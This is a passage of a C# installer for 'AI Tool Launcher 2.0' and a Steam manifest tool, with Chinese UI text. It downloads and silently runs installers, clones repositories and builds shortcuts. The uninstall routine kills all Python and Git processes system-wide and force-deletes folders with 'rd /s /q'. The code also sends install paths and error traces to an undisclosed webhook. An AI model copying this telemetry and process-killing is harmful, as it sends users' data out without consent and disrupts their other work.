                info.DisplayText = string.Format("Microsoft Edge WebView2 執行階段 v{0}", ver);
                info.OriginTag = "🛡️ 系統內建 (安全保護中)";
                info.TagColor = ColSuccess;
            }
            else
            {
                info.IsInstalled = false;
                info.DisplayText = "未檢測到 WebView2 獨立套件 (系統具備 Windows 內建 Edge)";
                info.OriginTag = "⚠️ 預設共用";
                info.TagColor = ColTextMuted;
            }
            return info;
        }

        // ==========================================
        // 核心套件 100% 精準版本提取 (pip list --format=json)
        // ==========================================
        private void DetectAllDetailedPackages(string pythonExe)
        {
            if (string.IsNullOrEmpty(pythonExe) || !File.Exists(pythonExe))
            {
                foreach (var p in packageList)
                {
                    p.IsInstalled = false;
                    p.Version = "";
                }
                return;
            }

            try
            {
                // 1. 主要方式：調用 pip list --format=json (標準、快速、精準)
                string jsonOutput = GetCommandOutput(pythonExe, "-m pip list --format=json");
                Dictionary<string, string> installedDict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

                if (!string.IsNullOrEmpty(jsonOutput))
                {
                    MatchCollection matches = Regex.Matches(jsonOutput, "\"name\":\\s*\"([^\"]+)\",\\s*\"version\":\\s*\"([^\"]+)\"");
                    foreach (Match m in matches)
                    {
                        installedDict[m.Groups[1].Value] = m.Groups[2].Value;
                    }
                }

                // 2. 備援方式：若 pip 無輸出或未安裝 pip，調用 Python 內建 importlib.metadata (無換行單行腳本)
                if (installedDict.Count == 0)
                {
                    string fallbackCmd = "-c \"import importlib.metadata as m; pkgs=['PySide6','PySide6-Fluent-Widgets','PySideSix-Frameless-Window','pywin32','pywebview','requests','gdown','Pillow']; [print(p+':'+m.version(p)) for p in pkgs]\"";
                    string fallbackOutput = GetCommandOutput(pythonExe, fallbackCmd);
                    if (!string.IsNullOrEmpty(fallbackOutput))
                    {
                        string[] lines = fallbackOutput.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                        foreach (string line in lines)
                        {
                            int colonIdx = line.IndexOf(':');
                            if (colonIdx > 0)
                            {
                                string pName = line.Substring(0, colonIdx).Trim();
                                string pVer = line.Substring(colonIdx + 1).Trim();
                                installedDict[pName] = pVer;
                            }
                        }
                    }
                }

                // 3. 逐一比對 8 大套件並賦值
                foreach (var item in packageList)
                {
                    string ver;
                    if (installedDict.TryGetValue(item.PackageName, out ver))
                    {
                        item.IsInstalled = true;
                        item.Version = "v" + ver;
                    }
                    else
                    {
                        item.IsInstalled = false;
                        item.Version = "";
                    }
                }
            }
            catch (Exception ex)
            {
                Log("解析套件清單警告: " + ex.Message, ColWarning);
            }
        }

        private void UpdateEnvironmentUI()
        {
            FormatEnvLabel(lblEnvPy, "🐍 Python 核心環境: ", envPy);
            FormatEnvLabel(lblEnvGit, "🐙 Git 版本控制工具: ", envGit);
            FormatEnvLabel(lblEnvWv, "🌐 Edge WebView2: ", envWv);

            // 更新 8 個獨立套件 Label
            UpdateSinglePackageLabel(lblPkgPySide6, packageList[0]);   // PySide6
            UpdateSinglePackageLabel(lblPkgFluent, packageList[1]);    // Fluent-Widgets
            UpdateSinglePackageLabel(lblPkgFrameless, packageList[2]); // Frameless-Window
            UpdateSinglePackageLabel(lblPkgWin32, packageList[3]);     // pywin32
            UpdateSinglePackageLabel(lblPkgWebview, packageList[4]);   // pywebview
            UpdateSinglePackageLabel(lblPkgRequests, packageList[5]);  // requests
            UpdateSinglePackageLabel(lblPkgGdown, packageList[6]);     // gdown
            UpdateSinglePackageLabel(lblPkgPillow, packageList[7]);    // Pillow

            // 統計總就緒率
            int totalReady = 0;
            foreach (var p in packageList) { if (p.IsInstalled) totalReady++; }
            lblPkgSectionTitle.Text = string.Format("📦 8 大核心依賴套件明細清單 (已就緒: {0}/8 項，逐一列出無濃縮)：", totalReady);

            // 一鍵卸載按鈕狀態
            if (envPy.IsInstalledByUs || envGit.IsInstalledByUs)
            {
                btnUninstallEnv.Text = "🗑️ 一鍵安全卸載";
                btnUninstallEnv.ForeColor = ColDanger;
                btnUninstallEnv.BackColor = Color.FromArgb(55, 25, 35);
            }
            else
            {
                btnUninstallEnv.Text = "🗑️ 一鍵清理本工具";
                btnUninstallEnv.ForeColor = ColTextMuted;
                btnUninstallEnv.BackColor = Color.FromArgb(30, 32, 45);
            }
        }

        private void UpdateSinglePackageLabel(Label lbl, PackageDetailItem item)
        {
            if (item.IsInstalled)
            {
                lbl.Text = string.Format("• {0}: {1}  [✅ 已就緒]", item.DisplayName, item.Version);
                lbl.ForeColor = ColSuccess;
            }
            else
            {
                lbl.Text = string.Format("• {0}: 未安裝  [❌ 待安裝]", item.DisplayName);
                lbl.ForeColor = ColWarning;
            }
        }

        private void FormatEnvLabel(Label lbl, string prefix, EnvComponentInfo info)
        {
            lbl.Text = string.Format("{0}{1}  [{2}]", prefix, info.DisplayText, info.OriginTag);
        }

        // ==========================================
        // 一鍵安全卸載功能 (Strict Provenance & Safe Cleanup)
        // ==========================================
        private void BtnUninstallEnv_Click(object sender, EventArgs e)
        {
            if (isInstalling) return;

            DateTime baseTime = GetInstallerBaseTime();
            StringBuilder sbProtected = new StringBuilder();
            StringBuilder sbToUninstall = new StringBuilder();

            // 1. Python 狀態
            if (envPy.IsInstalled)
            {
                if (envPy.IsInstalledByUs)
                {
                    sbToUninstall.AppendLine(string.Format("  • 🐍 Python 3.11 環境 ({0})", envPy.Path));
                }
                else
                {
                    sbProtected.AppendLine(string.Format("  • 🛡️ Python 環境: {0}\n    (檢測到安裝時間早於下載前 3 天，屬於「時間範圍之外」，受安全保護絕不更動！)", envPy.Path));
                }
            }

            // 2. Git 狀態
            if (envGit.IsInstalled)
            {
                if (envGit.IsInstalledByUs)
                {
                    sbToUninstall.AppendLine(string.Format("  • 🐙 Git 運行環境 ({0})", envGit.Path));
                }
                else
                {
                    sbProtected.AppendLine(string.Format("  • 🛡️ Git 工具: {0}\n    (檢測到安裝時間早於下載前 3 天，屬於「時間範圍之外」，受安全保護絕不更動！)", envGit.Path));
                }
            }

            // 3. AIToolLauncher 專案主體與捷徑
            string defaultDir = txtInstallPath.Text.Trim();
            sbToUninstall.AppendLine(string.Format("  • ⚡ AIToolLauncher 專案資料夾與所有組態 ({0})", defaultDir));
            sbToUninstall.AppendLine("  • 🖥️ 桌面專屬啟動捷徑 (AI Tool Launcher 與 SMU)");

            string confirmMsg = string.Format(
                "【AI Tool Launcher 2.0 - 智慧安全卸載與環境保護分析】\n\n" +
                "══════════════════════════════════════════\n" +
                "🛡️ 受到保護的環境 (早於下載前 3 天，屬於「時間範圍之外」絕不誤刪)：\n" +
                "{0}\n" +
                "══════════════════════════════════════════\n" +
                "🗑️ 判定為近期 (3天內) 或由本工具部屬之組件 (將安全清理)：\n" +
                "{1}\n" +
                "══════════════════════════════════════════\n\n" +
                "您確定要執行上述項目的安全卸載嗎？",
                sbProtected.Length > 0 ? sbProtected.ToString() : "  (無受保護的環境)\n",
                sbToUninstall.ToString()
            );

            DialogResult dr = MessageBox.Show(confirmMsg, "確認一鍵安全卸載", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr != DialogResult.Yes) return;

            isInstalling = true;
            btnAction.Enabled = false;
            btnUninstallEnv.Enabled = false;
            SetStatus("正在執行一鍵安全卸載中，請稍候...", ColWarning);
            Log("================ 開始執行安全卸載流水線 ================", ColWarning);

            Thread t = new Thread(() =>
            {
                try
                {
                    if (envPy.IsInstalledByUs && !string.IsNullOrEmpty(envPy.Path))
                    {
                        Log("⏳ 正在清理本工具部屬之 Python 3.11 官方環境...", ColAccentCyan);
                        KillProcessByName("python");
                        KillProcessByName("pythonw");
                        string pyDir = Path.GetDirectoryName(envPy.Path);
                        if (Directory.Exists(pyDir) && pyDir.ToLower().Contains(@"programs\python\python311"))
                        {
                            force_remove_directory(pyDir);
                            Log("✅ Python 3.11 目錄已安全移除: " + pyDir, ColSuccess);
                        }
                    }

                    if (envGit.IsInstalledByUs && !string.IsNullOrEmpty(envGit.Path))
                    {
                        Log("⏳ 正在清理本工具部屬之 Git 環境...", ColAccentCyan);
                        KillProcessByName("git");
                        string gitDir = Path.GetDirectoryName(Path.GetDirectoryName(envGit.Path));
                        if (Directory.Exists(gitDir) && gitDir.ToLower().Contains(@"programs\git"))
                        {
                            force_remove_directory(gitDir);
                            Log("✅ Git 目錄已安全移除: " + gitDir, ColSuccess);
                        }
                    }

                    string installDir = txtInstallPath.Text.Trim();
                    if (Directory.Exists(installDir))
                    {
                        Log("⏳ 正在清理 AI Tool Launcher 專案本體...", ColAccentCyan);
                        force_remove_directory(installDir);
                        Log("✅ 專案目錄已完全移除: " + installDir, ColSuccess);
                    }

                    Log("⏳ 正在清理桌面啟動捷徑...", ColAccentCyan);
                    string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                    string lnk1 = Path.Combine(desktop, "AI Tool Launcher 2.0.lnk");
                    string lnk2 = Path.Combine(desktop, "Steam Manifest 更新工具 2.0.lnk");
                    if (File.Exists(lnk1)) try { File.Delete(lnk1); } catch { }
                    if (File.Exists(lnk2)) try { File.Delete(lnk2); } catch { }
                    Log("✅ 桌面捷徑已清理完畢！", ColSuccess);

                    string manifestFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AIToolLauncher", "install_manifest.json");
                    if (File.Exists(manifestFile)) try { File.Delete(manifestFile); } catch { }

                    SendWebhookNotification("🗑️ 成功執行安全卸載", "使用者已成功清理由本工具安裝之環境與專案主體，系統原生環境完好受保護。", 0xE67E22);

                    this.Invoke(new Action(() =>
                    {
                        isInstalling = false;
                        btnAction.Enabled = true;
                        btnUninstallEnv.Enabled = true;
                        SetStatus("✅ 安全卸載完畢！所有由本工具安裝之組件已完全清除，未損及任何原生環境。", ColSuccess);
                        Log("================ 一鍵安全卸載作業順利完成 ================", ColSuccess);
                        RefreshEnvironmentStatusAsync();
                        MessageBox.Show("一鍵安全卸載完成！\n\n所有由本安裝器部屬的環境依賴與檔案已完全清除，且未對您的系統原生環境造成任何更動。", "卸載完成", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }));
                }
                catch (Exception ex)
                {
                    this.Invoke(new Action(() =>
                    {
                        isInstalling = false;
                        btnAction.Enabled = true;
                        btnUninstallEnv.Enabled = true;
                        SetStatus("❌ 卸載過程發生異常: " + ex.Message, ColDanger);
                        Log("💥 卸載異常: " + ex.Message, ColDanger);
                    }));
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        private void KillProcessByName(string pName)
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName(pName))
                {
                    try { p.Kill(); } catch { }
                }
            }
            catch { }
        }

        private static void force_remove_directory(string path)
        {
            if (!Directory.Exists(path)) return;
            try
            {
                foreach (string f in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
                {
                    try { File.SetAttributes(f, FileAttributes.Normal); } catch { }
                }
                Directory.Delete(path, true);
            }
            catch
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", string.Format("/c rd /s /q \"{0}\"", path));
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process p = Process.Start(psi);
                    p.WaitForExit(4000);
                }
                catch { }
            }
        }

        // ==========================================
        // 核心安裝入口
        // ==========================================
        private void BtnAction_Click(object sender, EventArgs e)
        {
            if (isCompleted)
            {
                LaunchToolLauncher();
                return;
            }

            if (isInstalling) return;

            string targetDir = txtInstallPath.Text.Trim();
            if (string.IsNullOrEmpty(targetDir))
            {
                MessageBox.Show("請指定有效的安裝路徑！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            isInstalling = true;
            btnAction.Enabled = false;
            btnAction.Text = "⏳ 正在安裝配置中，請稍候...";
            btnAction.BackColor = Color.FromArgb(50, 55, 75);
            btnBrowse.Enabled = false;
            txtInstallPath.ReadOnly = true;
            chkInstallSMU.Enabled = false;
            chkShortcut.Enabled = false;
            chkInstallGit.Enabled = false;
            btnUninstallEnv.Enabled = false;

            Thread t = new Thread(() =>
            {
                try
                {
                    RunInstallationPipeline(targetDir);
                }
                catch (Exception ex)
                {
                    SetStatus("❌ 安裝過程發生異常: " + ex.Message, ColDanger);
                    Log("💥 安裝中斷: " + ex.ToString(), ColDanger);
                    SendWebhookNotification("💥 AIToolLauncher 2.0 安裝失敗", ex.ToString(), 0xE74C3C);

                    this.Invoke(new Action(() =>
                    {
                        btnAction.Enabled = true;
                        btnAction.Text = "🔄 重試安裝";
                        btnAction.BackColor = Color.FromArgb(220, 38, 38);
                        isInstalling = false;
                        btnUninstallEnv.Enabled = true;
                    }));
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        // ==========================================
        // 安裝流水線 (含自動部屬 Git / Python / 專案)
        // ==========================================
        private void RunInstallationPipeline(string installDir)
        {
            Log("================ 開始執行 AI Tool Launcher 2.0 部屬流水線 ================", ColAccentCyan);
            Log("目標安裝路徑: " + installDir, Color.White);

            if (!Directory.Exists(installDir))
            {
                Directory.CreateDirectory(installDir);
            }

            SaveInitialManifest(installDir);

            // ------------------------------------------
            // 步驟 1: 系統環境準備 (Python 與 Git 官方檢測與安裝)
            // ------------------------------------------
            SetStepActive(0);
            string pythonExe = ResolvePythonExecutable();

            // 1.1 Python 檢測與安裝
            if (!string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
            {
                Log("✅ 系統已具備可用之 Python 環境: " + pythonExe, ColSuccess);
            }
            else
            {
                Log("⚠️ 未偵測到可用之 Python 環境，正在自 python.org 官方下載 Python 3.11.9...", ColWarning);
                SetStatus("正在下載官方 Python 3.11.9 靜默安裝包...", ColWarning);

                string pySetupPath = Path.Combine(Path.GetTempPath(), "python_setup_311.exe");
                DownloadFileWithProgress(PythonInstallerUrl, pySetupPath, "Python 3.11.9");

                SetStatus("正在靜默安裝 Python 3.11 (自動配置當前用戶環境)...", ColWarning);
                Log("⏳ 正在執行 Python 官方靜默安裝程序 (免提權、免管理員彈窗)...", ColAccentCyan);

                ProcessStartInfo psi = new ProcessStartInfo(pySetupPath, "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 SimpleInstall=1");
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process p = Process.Start(psi);
                p.WaitForExit();

                try { File.Delete(pySetupPath); } catch { }

                RefreshSystemPath();
                pythonExe = ResolvePythonExecutable();

                if (!string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
                {
                    Log("✅ Python 3.11.9 官方環境已成功安裝: " + pythonExe, ColSuccess);
                    RecordComponentInManifest("python", pythonExe, true);
                }
                else
                {
                    string fallbackPy = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "Python", "Python311", "python.exe");
                    if (File.Exists(fallbackPy))
                    {
                        pythonExe = fallbackPy;
                        RecordComponentInManifest("python", pythonExe, true);
                    }
                }
            }

            // 1.2 Git 核心檢測與自動安裝
            bool hasGit = CheckCommand("git", "--version");
            if (hasGit)
            {
                Log("✅ 系統已具備 Git 版本控制工具，自動更新管道暢通！", ColSuccess);
            }
            else if (chkInstallGit.Checked)
            {
                Log("⚠️ 系統未偵測到 Git 環境，正在自動下載並配置輕量化 MinGit (自動更新必備)...", ColWarning);
                SetStatus("正在下載官方 MinGit 64-bit 運行環境 (約 25MB)...", ColWarning);

                string gitZip = Path.Combine(Path.GetTempPath(), "mingit_64.zip");
                DownloadFileWithProgress(MinGitZipUrl, gitZip, "MinGit 64-bit");

                SetStatus("正在配置 Git 環境至用戶目錄 (免管理員提權)...", ColWarning);
                Log("⏳ 正在解壓縮並安裝 Git 核心模組...", ColAccentCyan);

                string targetGitDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "Git");
                if (!Directory.Exists(targetGitDir)) Directory.CreateDirectory(targetGitDir);

                try
                {
                    ZipFile.ExtractToDirectory(gitZip, targetGitDir);
                    try { File.Delete(gitZip); } catch { }

                    string gitCmdDir = Path.Combine(targetGitDir, "cmd");
                    AddPathToUserEnvironment(gitCmdDir);
                    RefreshSystemPath();

                    if (CheckCommand("git", "--version"))
                    {
                        Log("✅ MinGit 官方環境已成功配置至: " + targetGitDir, ColSuccess);
                        RecordComponentInManifest("git", Path.Combine(gitCmdDir, "git.exe"), true);
                        hasGit = true;
                    }
                }
                catch (Exception gEx)
                {
                    Log("⚠️ 配置 MinGit 發生警告: " + gEx.Message, ColWarning);
                }
            }

            SetStepActive(0, true);
            SetProgress(20);

            // ------------------------------------------
            // 步驟 2: 拉取 AI Tool Launcher 2.0 核心主體
            // ------------------------------------------
            SetStepActive(1);
            SetStatus("正在部屬 AI Tool Launcher 2.0 核心主專案...", ColAccentCyan);
            Log("⏳ 正在獲取 AI Tool Launcher 2.0 專案程式碼 (含 .git 追蹤版本庫)...", ColAccentCyan);

            bool needFetch = true;
            string currentAppDir = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\', '/');
            string currentMain = Path.Combine(currentAppDir, "main.py");
            if (File.Exists(currentMain) && !string.Equals(currentAppDir, installDir.TrimEnd('\\', '/'), StringComparison.OrdinalIgnoreCase))
            {
                Log("⚡ 偵測到本地安裝器所在目錄已具備專案源碼，正在執行本地極速部屬...", ColSuccess);
                CopyDirectory(currentAppDir, installDir);
                needFetch = false;
            }

            if (needFetch)
            {
                bool cloneSuccess = false;
                if (hasGit || CheckCommand("git", "--version"))
                {
                    Log("⏳ 執行 git clone 獲取最新主分支專案 (保留完整 .git 自動更新能力)...", ColAccentCyan);
                    SetStatus("正在透過 Git Clone 獲取最新主程式...", ColAccentCyan);

                    string gitCmd = string.Format("clone https://github.com/JiaSai67/AIToolLauncher.git \"{0}\"", installDir);
                    if (Directory.GetFiles(installDir).Length > 0 || Directory.GetDirectories(installDir).Length > 0)
                    {
                        if (Directory.Exists(Path.Combine(installDir, ".git")))
                        {
                            RunProcessCaptureOutput("git", "fetch origin main", installDir);
                            RunProcessCaptureOutput("git", "reset --hard origin/main", installDir);
                            cloneSuccess = true;
                        }
                    }
                    else
                    {
                        ProcessStartInfo psi = new ProcessStartInfo("git", gitCmd);
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit(90000);
                        cloneSuccess = (p.ExitCode == 0);
                    }
                }

                if (!cloneSuccess)
                {
                    Log("🔄 使用 GitHub 原生 ZIP 高速下載通道...", ColAccentCyan);
                    SetStatus("正在從 GitHub 下載 AIToolLauncher 2.0 ZIP 包...", ColWarning);
                    string zipPath = Path.Combine(Path.GetTempPath(), "aitoollauncher_20.zip");

                    DownloadFileWithProgress(RepoZipUrl, zipPath, "AIToolLauncher 2.0 ZIP");

                    SetStatus("正在解壓縮專案至目標目錄...", ColWarning);
                    Log("⏳ 解壓縮檔案中...", ColAccentCyan);

                    string extractTemp = Path.Combine(Path.GetTempPath(), "aitoollauncher_ext_" + Guid.NewGuid().ToString("N"));
                    if (Directory.Exists(extractTemp)) Directory.Delete(extractTemp, true);

                    ZipFile.ExtractToDirectory(zipPath, extractTemp);

                    string extractedFolder = Path.Combine(extractTemp, "AIToolLauncher-main");
                    if (Directory.Exists(extractedFolder))
                    {
                        CopyDirectory(extractedFolder, installDir);
                    }
                    else
                    {
                        CopyDirectory(extractTemp, installDir);
                    }

                    try { File.Delete(zipPath); } catch { }
                    try { Directory.Delete(extractTemp, true); } catch { }
                }
            }

            Log("✅ AI Tool Launcher 2.0 主專案部屬完成！", ColSuccess);
            SetStepActive(1, true);
            SetProgress(45);

            // ------------------------------------------
            // 步驟 3: 安裝 ToolLauncher 2.0 requirements 依賴庫 (6 大核心套件)
            // ------------------------------------------
            SetStepActive(2);
            if (!string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
            {
                SetStatus("正在配置 AI Tool Launcher 2.0 介面核心依賴 (PySide6 / FluentWidgets 等 6 項)...", ColWarning);
                Log("⏳ 正在執行 pip install 安裝 2.0 現代化介面相依套件 (PySide6 / FluentWidgets / FramelessWindow / pywin32 / requests / pywebview)...", ColAccentCyan);

                string reqFile = Path.Combine(installDir, "resources", "requirements.txt");
                if (!File.Exists(reqFile)) reqFile = Path.Combine(installDir, "requirements.txt");

                RunProcessCaptureOutput(pythonExe, "-m pip install --upgrade pip", installDir);

                if (File.Exists(reqFile))
                {
                    RunProcessCaptureOutput(pythonExe, string.Format("-m pip install -r \"{0}\"", reqFile), installDir);
                }
                
                // 核心備援補全：確保 6 大必要套件 100% 安裝到位
                RunProcessCaptureOutput(pythonExe, "-m pip install PySide6 PySide6-Fluent-Widgets PySideSix-Frameless-Window pywin32 requests pywebview", installDir);
                Log("✅ ToolLauncher 2.0 核心介面套件已配置完畢！", ColSuccess);
            }
            SetStepActive(2, true);
            SetProgress(65);

            // ------------------------------------------
            // 步驟 4: 部屬 SteamManifestUpdater (SMU 2.0) 與其專屬依賴 (gdown / Pillow 等 4 項)
            // ------------------------------------------
            SetStepActive(3);
            if (chkInstallSMU.Checked)
            {
                SetStatus("正在配置 SteamManifestUpdater (SMU 2.0) 模組與相依套件...", ColAccentCyan);
                Log("🎮 開始部屬 SteamManifestUpdater (SMU 2.0) 雲端工具模組...", ColAccentCyan);

                string smuDir = Path.Combine(installDir, "CloudTools", "SteamManifestUpdater");
                if (!Directory.Exists(smuDir)) Directory.CreateDirectory(smuDir);

                bool smuCloneSuccess = false;
                if (hasGit || CheckCommand("git", "--version"))
                {
                    if (Directory.GetFiles(smuDir).Length == 0 && Directory.GetDirectories(smuDir).Length == 0)
                    {
                        Log("⏳ 透過 Git Clone 下載 SteamManifestUpdater 最新倉庫...", ColAccentCyan);
                        string gitCmd = string.Format("clone https://github.com/JiaSai67/SteamManifestUpdater.git \"{0}\"", smuDir);
                        ProcessStartInfo psi = new ProcessStartInfo("git", gitCmd);
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit(90000);
                        smuCloneSuccess = (p.ExitCode == 0);
                    }
                }

                if (!smuCloneSuccess && Directory.GetFiles(smuDir).Length == 0)
                {
                    string smuZip = Path.Combine(Path.GetTempPath(), "smu_20.zip");
                    DownloadFileWithProgress(SmuZipUrl, smuZip, "SteamManifestUpdater");

                    string smuExtractTemp = Path.Combine(Path.GetTempPath(), "smu_ext_" + Guid.NewGuid().ToString("N"));
                    if (Directory.Exists(smuExtractTemp)) Directory.Delete(smuExtractTemp, true);

                    ZipFile.ExtractToDirectory(smuZip, smuExtractTemp);
                    string smuExtractedFolder = Path.Combine(smuExtractTemp, "SteamManifestUpdater-main");
                    if (Directory.Exists(smuExtractedFolder))
                    {
                        CopyDirectory(smuExtractedFolder, smuDir);
                    }
                    else
                    {
                        CopyDirectory(smuExtractTemp, smuDir);
                    }

                    try { File.Delete(smuZip); } catch { }
                    try { Directory.Delete(smuExtractTemp, true); } catch { }
                }

                Log("✅ SMU 專案核心檔案已配置至 CloudTools\\SteamManifestUpdater！", ColSuccess);

                // 安裝 SMU requirements (含 gdown / Pillow / pywebview / requests 備援補全)
                if (!string.IsNullOrEmpty(pythonExe) && File.Exists(pythonExe))
                {
                    Log("⏳ 正在配置 SteamManifestUpdater 核心依賴 (gdown / Pillow / pywebview / requests)...", ColAccentCyan);
                    string smuReq = Path.Combine(smuDir, "requirements.txt");
                    if (File.Exists(smuReq))
                    {
                        RunProcessCaptureOutput(pythonExe, string.Format("-m pip install -r \"{0}\"", smuReq), smuDir);
                    }
                    RunProcessCaptureOutput(pythonExe, "-m pip install gdown Pillow pywebview requests", smuDir);
                    Log("✅ SMU 專屬相依套件已配置完畢！", ColSuccess);
                }

                // 校準 registry.json
                UpdateRegistryWithSMU(installDir, smuDir);

                // 編譯專屬 SteamManifestUpdater.exe
                BuildSmuWrapperIfNecessary(smuDir);
            }
            SetStepActive(3, true);
            SetProgress(85);

            // ------------------------------------------
            // 步驟 5: 建立桌面捷徑與完成
            // ------------------------------------------
            SetStepActive(4);
            if (chkShortcut.Checked)
            {
                CreateDesktopShortcuts(installDir);
            }

            SetProgress(100);
            SetStepActive(4, true);

            isCompleted = true;
            SetStatus("🎉 AI Tool Launcher 2.0 安裝已全部完成！點擊下方按鈕即可啟動。", ColSuccess);
            Log("================ AI Tool Launcher 2.0 部屬圓滿完成！ ================", ColSuccess);

            SendWebhookNotification("🎉 AIToolLauncher 2.0 安裝成功", string.Format("安裝路徑: {0}\nGit 已配置: {1}\nPython: {2}", installDir, hasGit, pythonExe), 0x2ECC71);

            this.Invoke(new Action(() =>
            {
                btnAction.Enabled = true;
                btnAction.Text = "🚀 啟動 AI Tool Launcher 2.0";
                btnAction.BackColor = Color.FromArgb(16, 185, 129);
                isInstalling = false;
                btnUninstallEnv.Enabled = true;
                RefreshEnvironmentStatusAsync();
            }));
        }

        private void BuildSmuWrapperIfNecessary(string smuDir)
        {
            try
            {
                string smuExe = Path.Combine(smuDir, "SteamManifestUpdater.exe");
                string wrapperCs = Path.Combine(smuDir, "Wrapper.cs");
                string sakuraIco = Path.Combine(smuDir, "assets", "sakura.ico");
                if (!File.Exists(sakuraIco)) sakuraIco = Path.Combine(smuDir, "icon.ico");

                if (!File.Exists(smuExe) && File.Exists(wrapperCs))
                {
                    Log("⏳ 正在現場編譯 SMU 專屬櫻花啟動器 (SteamManifestUpdater.exe)...", ColAccentCyan);
                    string csc = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe";
                    if (!File.Exists(csc)) csc = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";

                    if (File.Exists(csc))
                    {
                        string cscArgs = string.Format("/target:winexe /optimize+ /platform:x64 /win32icon:\"{0}\" /out:\"{1}\" /r:System.dll,System.Core.dll,System.Drawing.dll,System.Windows.Forms.dll \"{2}\"", sakuraIco, smuExe, wrapperCs);
                        ProcessStartInfo cscPsi = new ProcessStartInfo(csc, cscArgs);
                        cscPsi.WorkingDirectory = smuDir;
                        cscPsi.UseShellExecute = false;
                        cscPsi.CreateNoWindow = true;
                        Process cscProc = Process.Start(cscPsi);
                        cscProc.WaitForExit(6000);

                        if (File.Exists(smuExe))
                        {
                            Log("🌸 專屬櫻花 SteamManifestUpdater.exe 已現場編譯完成！", ColSuccess);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log("⚠️ 現場編譯 SMU 啟動器警告: " + ex.Message, ColWarning);
            }
        }

        private void CreateDesktopShortcuts(string installDir)
        {
            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

                string launcherExe = Path.Combine(installDir, "AIToolLauncher.exe");
                string targetLauncher = File.Exists(launcherExe) ? launcherExe : Path.Combine(installDir, "啟動_AIToolLauncher.bat");
                string launcherIcon = Path.Combine(installDir, "resources", "icon.ico");
                string launcherLnk = Path.Combine(desktop, "AI Tool Launcher 2.0.lnk");

                CreateSingleShortcut(launcherLnk, targetLauncher, installDir, launcherIcon);
                Log("✨ 已為您建立桌面捷徑：AI Tool Launcher 2.0", ColSuccess);

                if (chkInstallSMU.Checked)
                {
                    string smuDir = Path.Combine(installDir, "CloudTools", "SteamManifestUpdater");
                    if (Directory.Exists(smuDir))
                    {
                        string smuExe = Path.Combine(smuDir, "SteamManifestUpdater.exe");
                        string smuBat = Path.Combine(smuDir, "啟動_SteamManifestUpdater.bat");
                        string targetSmu = File.Exists(smuExe) ? smuExe : (File.Exists(smuBat) ? smuBat : smuExe);

                        string smuIcon = Path.Combine(smuDir, "assets", "sakura.ico");
                        if (!File.Exists(smuIcon)) smuIcon = Path.Combine(smuDir, "icon.ico");

                        string smuLnk = Path.Combine(desktop, "Steam Manifest 更新工具 2.0.lnk");
                        CreateSingleShortcut(smuLnk, targetSmu, smuDir, smuIcon);
                        Log("🌸 已為您建立桌面捷徑：Steam Manifest 更新工具 2.0 (專屬櫻花圖示)", ColSuccess);
                    }
                }
            }
            catch (Exception ex)
            {
                Log("⚠️ 建立桌面捷徑時發生微小異常: " + ex.Message, ColWarning);
            }
        }

        private void CreateSingleShortcut(string lnkPath, string targetPath, string workDir, string iconPath)
        {
            try
            {
                string psScript = string.Format(
                    "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('{0}'); $Shortcut.TargetPath = '{1}'; $Shortcut.WorkingDirectory = '{2}'; if (Test-Path '{3}') {{ $Shortcut.IconLocation = '{3}' }}; $Shortcut.Save()",
                    lnkPath, targetPath, workDir, iconPath
                );

                ProcessStartInfo psPsi = new ProcessStartInfo("powershell", "-NoProfile -ExecutionPolicy Bypass -Command \"" + psScript.Replace("\"", "\\\"") + "\"");
                psPsi.CreateNoWindow = true;
                psPsi.UseShellExecute = false;
                Process ps = Process.Start(psPsi);
                ps.WaitForExit(3000);
            }
            catch { }
        }

        private void LaunchToolLauncher()
        {
            try
            {
                string installDir = txtInstallPath.Text.Trim();
                string launcherExe = Path.Combine(installDir, "AIToolLauncher.exe");
                string batFile = Path.Combine(installDir, "啟動_AIToolLauncher.bat");

                if (File.Exists(launcherExe))
                {
                    Log("🚀 正在啟動 AIToolLauncher.exe 主程式...", ColAccentCyan);
                    ProcessStartInfo psi = new ProcessStartInfo(launcherExe);
                    psi.WorkingDirectory = installDir;
                    psi.UseShellExecute = true;
                    Process.Start(psi);
                }
                else if (File.Exists(batFile))
                {
                    Log("🚀 正在執行 啟動_AIToolLauncher.bat...", ColAccentCyan);
                    ProcessStartInfo psi = new ProcessStartInfo(batFile);
                    psi.WorkingDirectory = installDir;
                    psi.UseShellExecute = true;
                    Process.Start(psi);
                }
                this.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show("啟動異常: " + ex.Message, "錯誤", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UpdateRegistryWithSMU(string installDir, string smuDir)
        {
            try
            {
